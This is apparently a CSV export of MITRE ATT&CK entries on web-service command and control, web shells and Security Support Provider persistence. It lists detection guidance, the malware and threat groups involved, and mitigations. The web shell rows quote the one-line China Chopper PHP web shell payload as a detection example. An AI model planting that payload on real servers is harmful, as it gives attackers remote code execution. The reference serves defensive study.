1049,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']",['[[Software/S0013|PlugX]] uses Pastebin to store its real C2 addresses.[[CiteRef::Palo Alto PlugX June 2017]]'],['DragonOK'],['DragonOK'],['G0017'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1050,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']",['[[Software/S0042|LOWBALL]] uses the Dropbox cloud storage service for command and control.[[CiteRef::FireEye admin@338]]'],['admin@338'],['admin@338'],['G0018'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: LOWBALL,['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1051,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']","['The ""tDiscoverer"" variant of [[Software/S0037|HAMMERTOSS]] establishes a C2 channel by downloading resources from Web services like Twitter and GitHub. [[Software/S0037|HAMMERTOSS]] binaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day.[[CiteRef::FireEye APT29]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: HAMMERTOSS, HammerDuke, NetDuke",['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1052,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']",['[[Software/S0046|CozyCar]] uses Twitter as a backup C2 channel to Twitter accounts specified in its configuration file.[[CiteRef::F-Secure CozyDuke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: CozyCar, CozyDuke, ...",['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1053,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']",['One variant of [[Software/S0054|CloudDuke]] uses a Microsoft OneDrive account to exchange commands and stolen data with its operators.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: CloudDuke, MiniDionis, CloudLook",['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1054,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']",['Some [[Software/S0051|MiniDuke]] components use Twitter to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds.[[CiteRef::F-Secure The Dukes]][[CiteRef::Securelist MiniDuke Feb 2013]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: MiniDuke,['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1055,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']",['[[Software/S0052|OnionDuke]] uses Twitter as a backup C2 method. It also has a module designed to post messages to the Russian VKontakte social media site.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: OnionDuke,['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1056,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']",['[[Software/S0013|PlugX]] uses Pastebin to store its real C2 addresses.[[CiteRef::Palo Alto PlugX June 2017]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1057,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']",['[[Software/S0013|PlugX]] uses Pastebin to store its real C2 addresses.[[CiteRef::Palo Alto PlugX June 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1058,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']",['[[Group/G0040|Patchwork]] hides base64-encoded and encrypted C2 server locations in comments on legitimate websites.[[CiteRef::Securelist Dropping Elephant]]'],['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1059,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']",['[[Software/S0013|PlugX]] uses Pastebin to store its real C2 addresses.[[CiteRef::Palo Alto PlugX June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1060,"[""Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload:[[CiteRef::Lee 2013]]\n\n<code><?php @eval($_POST['password']);></code>\n\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [[Software/S0106|cmd]] or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network.[[CiteRef::US-CERT Alert TA15-314A Web Shells]]""]",[],[],[],"['Anti-virus', 'File monitoring', 'Process monitoring', 'Authentication logs', 'Netflow/Enclave netflow']",['[[Group/G0009|Deep Panda]] uses Web shells on publicly accessible Web servers to access victim networks.[[CiteRef::CrowdStrike Deep Panda Web Shells]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],['Ensure that externally facing Web servers are patched regularly to prevent adversary access through [[Technique/T1068|Exploitation of Vulnerability]] to gain remote code access or through file inclusion weaknesses that may allow adversaries to upload files or scripts that are automatically served as Web pages. \n\nAudit account and group permissions to ensure that accounts used to manage servers do not overlap with accounts and permissions of users in the internal network that could be acquired through [[Credential Access]] and used to log into the Web server and plant a Web shell or pivot from the Web server into the internal network.[[CiteRef::US-CERT Alert TA15-314A Web Shells]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Adversary access to Web server with vulnerability or account to upload and serve the Web shell file.'],[],"['Persistence', 'Privilege Escalation']",['Technique/T1100'],['Web Shell'],https://attack.mitre.org/wiki/Technique/T1100
1061,"[""Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload:[[CiteRef::Lee 2013]]\n\n<code><?php @eval($_POST['password']);></code>\n\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [[Software/S0106|cmd]] or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network.[[CiteRef::US-CERT Alert TA15-314A Web Shells]]""]",[],[],[],"['Anti-virus', 'File monitoring', 'Process monitoring', 'Authentication logs', 'Netflow/Enclave netflow']","['The [[Software/S0020|China Chopper]] backdoor is a Web shell that supports server payloads for many different kinds of server-side scripting languages and contains functionality to access files, connect to a database, and open a virtual command prompt.[[CiteRef::Lee 2013]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Ensure that externally facing Web servers are patched regularly to prevent adversary access through [[Technique/T1068|Exploitation of Vulnerability]] to gain remote code access or through file inclusion weaknesses that may allow adversaries to upload files or scripts that are automatically served as Web pages. \n\nAudit account and group permissions to ensure that accounts used to manage servers do not overlap with accounts and permissions of users in the internal network that could be acquired through [[Credential Access]] and used to log into the Web server and plant a Web shell or pivot from the Web server into the internal network.[[CiteRef::US-CERT Alert TA15-314A Web Shells]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Adversary access to Web server with vulnerability or account to upload and serve the Web shell file.'],Software: China Chopper,"['Persistence', 'Privilege Escalation']",['Technique/T1100'],['Web Shell'],https://attack.mitre.org/wiki/Technique/T1100
1062,"[""Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload:[[CiteRef::Lee 2013]]\n\n<code><?php @eval($_POST['password']);></code>\n\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [[Software/S0106|cmd]] or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network.[[CiteRef::US-CERT Alert TA15-314A Web Shells]]""]",[],[],[],"['Anti-virus', 'File monitoring', 'Process monitoring', 'Authentication logs', 'Netflow/Enclave netflow']",['[[Software/S0072|OwaAuth]] is a Web shell that appears to be exclusively used by [[Group/G0027|Threat Group-3390]].[[CiteRef::Dell TG-3390]] It is installed as an ISAPI filter on Exchange servers and shares characteristics with the [[Software/S0020|China Chopper]] Web shell.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Ensure that externally facing Web servers are patched regularly to prevent adversary access through [[Technique/T1068|Exploitation of Vulnerability]] to gain remote code access or through file inclusion weaknesses that may allow adversaries to upload files or scripts that are automatically served as Web pages. \n\nAudit account and group permissions to ensure that accounts used to manage servers do not overlap with accounts and permissions of users in the internal network that could be acquired through [[Credential Access]] and used to log into the Web server and plant a Web shell or pivot from the Web server into the internal network.[[CiteRef::US-CERT Alert TA15-314A Web Shells]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Adversary access to Web server with vulnerability or account to upload and serve the Web shell file.'],Software: OwaAuth,"['Persistence', 'Privilege Escalation']",['Technique/T1100'],['Web Shell'],https://attack.mitre.org/wiki/Technique/T1100
1063,"[""Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload:[[CiteRef::Lee 2013]]\n\n<code><?php @eval($_POST['password']);></code>\n\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [[Software/S0106|cmd]] or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network.[[CiteRef::US-CERT Alert TA15-314A Web Shells]]""]",[],[],[],"['Anti-virus', 'File monitoring', 'Process monitoring', 'Authentication logs', 'Netflow/Enclave netflow']",['[[Software/S0073|ASPXSpy]] is a Web shell.[[CiteRef::Dell TG-3390]] The ASPXTool version used by [[Group/G0027|Threat Group-3390]] has been deployed to accessible servers running Internet Information Services (IIS).[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Ensure that externally facing Web servers are patched regularly to prevent adversary access through [[Technique/T1068|Exploitation of Vulnerability]] to gain remote code access or through file inclusion weaknesses that may allow adversaries to upload files or scripts that are automatically served as Web pages. \n\nAudit account and group permissions to ensure that accounts used to manage servers do not overlap with accounts and permissions of users in the internal network that could be acquired through [[Credential Access]] and used to log into the Web server and plant a Web shell or pivot from the Web server into the internal network.[[CiteRef::US-CERT Alert TA15-314A Web Shells]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Adversary access to Web server with vulnerability or account to upload and serve the Web shell file.'],"Software: ASPXSpy, ASPXTool","['Persistence', 'Privilege Escalation']",['Technique/T1100'],['Web Shell'],https://attack.mitre.org/wiki/Technique/T1100
1064,['Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]'],[],[],[],"['DLL monitoring', 'Windows Registry', 'Loaded DLLs']",['The [[Software/S0002|Mimikatz]] credential dumper contains an implementation of an SSP.[[CiteRef::Deply Mimikatz]]'],['PittyTiger'],['PittyTiger'],['G0011'],"['Windows 8.1, Windows Server 2012 R2, and later versions may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, which requires all SSP DLLs to be signed by Microsoft.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Persistence'],['Technique/T1101'],['Security Support Provider'],https://attack.mitre.org/wiki/Technique/T1101
1065,['Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]'],[],[],[],"['DLL monitoring', 'Windows Registry', 'Loaded DLLs']",['The [[Software/S0002|Mimikatz]] credential dumper contains an implementation of an SSP.[[CiteRef::Deply Mimikatz]]'],['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"['Windows 8.1, Windows Server 2012 R2, and later versions may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, which requires all SSP DLLs to be signed by Microsoft.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Persistence'],['Technique/T1101'],['Security Support Provider'],https://attack.mitre.org/wiki/Technique/T1101
1066,['Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]'],[],[],[],"['DLL monitoring', 'Windows Registry', 'Loaded DLLs']",['The [[Software/S0002|Mimikatz]] credential dumper contains an implementation of an SSP.[[CiteRef::Deply Mimikatz]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Windows 8.1, Windows Server 2012 R2, and later versions may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, which requires all SSP DLLs to be signed by Microsoft.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Persistence'],['Technique/T1101'],['Security Support Provider'],https://attack.mitre.org/wiki/Technique/T1101
